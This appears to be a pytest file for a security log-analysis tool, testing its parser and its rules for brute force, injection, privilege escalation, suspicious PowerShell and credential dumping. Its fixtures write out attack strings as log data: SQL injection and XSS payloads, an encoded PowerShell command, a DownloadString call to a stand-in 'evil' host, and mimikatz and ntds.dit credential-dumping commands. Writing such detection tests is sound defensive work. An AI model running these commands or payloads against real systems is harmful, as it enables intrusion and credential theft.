import pytest
from datetime import datetime, timedelta
from app.parser import parse_log_line
from app.rules import (
    detect_brute_force,
    detect_credential_dumping,
    detect_injection_attacks,
    detect_privilege_escalation,
    detect_suspicious_powershell,
)
from app import models

# --- Parser Tests ------------------------------------------------------

def test_parse_json_log():
    # Valid JSON log
    line = '{"timestamp": "2026-07-01T12:00:00Z", "level": "ERROR", "ip_address": "192.168.1.50", "username": "admin", "event_id": "AUTH_FAILURE", "message": "Failed login attempt"}'
    res = parse_log_line(line)
    
    assert res["severity"] == "ERROR"
    assert res["ip_address"] == "192.168.1.50"
    assert res["user_name"] == "admin"
    assert res["event_id"] == "AUTH_FAILURE"
    assert res["message"] == "Failed login attempt"
    assert isinstance(res["timestamp"], datetime)

def test_parse_syslog():
    # Standard RFC3164 Syslog log
    line = "Jul  1 10:00:23 webserver01 sshd: failed password for invalid user root from 10.0.0.1"
    res = parse_log_line(line)
    
    assert res["hostname"] == "webserver01"
    assert res["severity"] == "ERROR"  # inferred from "failed password"
    assert res["ip_address"] == "10.0.0.1"
    assert res["user_name"] == "root"
    assert res["event_id"] in ("AUTH_FAILURE", "INVALID_USER")
    assert "sshd: failed password" in res["message"]
    assert res["timestamp"] is not None

def test_parse_freeform_auth_log():
    # Free-form log line with timestamp prefix
    line = "2026-07-01 10:00:00 WARNING Failed login for user test_user from 8.8.8.8"
    res = parse_log_line(line)
    
    assert res["severity"] == "WARNING"
    assert res["ip_address"] == "8.8.8.8"
    assert res["user_name"] == "test_user"
    assert res["event_id"] == "AUTH_FAILURE"  # inferred from "Failed login"
    assert res["message"] == "Failed login for user test_user from 8.8.8.8"


# --- Detection Rules Tests ---------------------------------------------

def test_brute_force_detection():
    # Create 5 failed login attempts from same IP within 2 minutes
    base_time = datetime(2026, 7, 1, 12, 0, 0)
    entries = [
        models.LogEntry(
            timestamp=base_time + timedelta(seconds=i * 20),
            ip_address="1.2.3.4",
            event_id="AUTH_FAILURE",
            user_name="victim_user",
            message="failed login attempt"
        )
        for i in range(5)
    ]
    
    findings = detect_brute_force(entries)
    assert len(findings) == 1
    finding = findings[0]
    assert finding["rule_name"] == "Brute force login"
    assert finding["severity"] == "HIGH"
    assert finding["affected_ip"] == "1.2.3.4"
    assert finding["affected_user"] == "victim_user"
    assert finding["mitre_technique"] == "T1110"
    assert finding["mitre_tactic"] == "Credential Access"

def test_no_brute_force_below_threshold():
    # Only 4 failed attempts from same IP
    base_time = datetime(2026, 7, 1, 12, 0, 0)
    entries = [
        models.LogEntry(
            timestamp=base_time + timedelta(seconds=i * 20),
            ip_address="1.2.3.4",
            event_id="AUTH_FAILURE",
            user_name="victim_user",
            message="failed login attempt"
        )
        for i in range(4)
    ]
    
    findings = detect_brute_force(entries)
    assert len(findings) == 0

def test_sql_injection_detection():
    # SQL Injection keywords: UNION SELECT (use plain spaces as expected by the rule pattern)
    entries_sql_union = [
        models.LogEntry(
            ip_address="5.6.7.8",
            message="GET /products?id=1 UNION SELECT username, password FROM users"
        )
    ]
    findings_sql = detect_injection_attacks(entries_sql_union)
    assert len(findings_sql) == 1
    assert findings_sql[0]["rule_name"] == "SQL/XSS injection signature"
    assert findings_sql[0]["severity"] == "CRITICAL"
    assert findings_sql[0]["mitre_technique"] == "T1190"
    assert findings_sql[0]["mitre_tactic"] == "Initial Access"
    assert findings_sql[0]["affected_ip"] == "5.6.7.8"

    # SQL Injection keywords: OR 1=1
    entries_sql_or = [
        models.LogEntry(
            ip_address="9.10.11.12",
            message="POST /login username=admin' OR 1=1"
        )
    ]
    findings_sql_or = detect_injection_attacks(entries_sql_or)
    assert len(findings_sql_or) == 1
    assert "OR 1=1" in findings_sql_or[0]["title"]
    assert findings_sql_or[0]["severity"] == "CRITICAL"
    assert findings_sql_or[0]["mitre_technique"] == "T1190"

    # XSS keyword: <script
    entries_xss = [
        models.LogEntry(
            ip_address="13.14.15.16",
            message="POST /comment comment=<script>alert('XSS')</script>"
        )
    ]
    findings_xss = detect_injection_attacks(entries_xss)
    assert len(findings_xss) == 1
    assert "<script>" in findings_xss[0]["title"]
    assert findings_xss[0]["severity"] == "CRITICAL"
    assert findings_xss[0]["mitre_technique"] == "T1190"


def test_privilege_escalation_detection():
    # Keyword signature: sudo
    entries_sudo = [
        models.LogEntry(user_name="intern", ip_address="10.0.0.9", message="intern ran: sudo su -")
    ]
    findings_sudo = detect_privilege_escalation(entries_sudo)
    assert len(findings_sudo) == 1
    assert findings_sudo[0]["rule_name"] == "Privilege escalation"
    assert findings_sudo[0]["severity"] == "HIGH"
    assert findings_sudo[0]["mitre_technique"] == "T1548"
    assert findings_sudo[0]["mitre_tactic"] == "Privilege Escalation"
    assert findings_sudo[0]["affected_user"] == "intern"

    # Windows event ID signature: 4728 (member added to a security-enabled group)
    entries_event_id = [
        models.LogEntry(user_name="jdoe", event_id="4728", message="A member was added to a security-enabled group.")
    ]
    findings_event_id = detect_privilege_escalation(entries_event_id)
    assert len(findings_event_id) == 1
    assert "4728" in findings_event_id[0]["title"]

    # No signature present
    entries_clean = [models.LogEntry(message="user logged in successfully")]
    assert detect_privilege_escalation(entries_clean) == []


def test_suspicious_powershell_detection():
    # Encoded command flag
    entries_encoded = [
        models.LogEntry(
            user_name="svc_account",
            message="powershell.exe -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdA==",
        )
    ]
    findings_encoded = detect_suspicious_powershell(entries_encoded)
    assert len(findings_encoded) == 1
    assert findings_encoded[0]["rule_name"] == "Suspicious PowerShell"
    assert findings_encoded[0]["severity"] == "HIGH"
    assert findings_encoded[0]["mitre_technique"] == "T1059.001"
    assert findings_encoded[0]["mitre_tactic"] == "Execution"

    # Remote download cmdlet
    entries_download = [
        models.LogEntry(message="powershell -c \"(New-Object Net.WebClient).DownloadString('http://evil/x.ps1')\"")
    ]
    assert len(detect_suspicious_powershell(entries_download)) == 1

    # Mentions "powershell" but no suspicious signature — should not fire
    entries_benign = [models.LogEntry(message="powershell.exe -File backup.ps1")]
    assert detect_suspicious_powershell(entries_benign) == []

    # Suspicious keyword without "powershell" in the message — should not fire
    entries_no_powershell = [models.LogEntry(message="invoke-expression on a web request")]
    assert detect_suspicious_powershell(entries_no_powershell) == []


def test_credential_dumping_detection():
    entries_mimikatz = [
        models.LogEntry(user_name="admin", message="Process created: mimikatz.exe sekurlsa::logonpasswords")
    ]
    findings = detect_credential_dumping(entries_mimikatz)
    assert len(findings) == 1
    assert findings[0]["rule_name"] == "Credential dumping"
    assert findings[0]["severity"] == "CRITICAL"
    assert findings[0]["mitre_technique"] == "T1003"
    assert findings[0]["mitre_tactic"] == "Credential Access"

    entries_ntds = [models.LogEntry(message="vssadmin create shadow copy to extract ntds.dit")]
    assert len(detect_credential_dumping(entries_ntds)) == 1

    entries_clean = [models.LogEntry(message="scheduled backup completed successfully")]
    assert detect_credential_dumping(entries_clean) == []
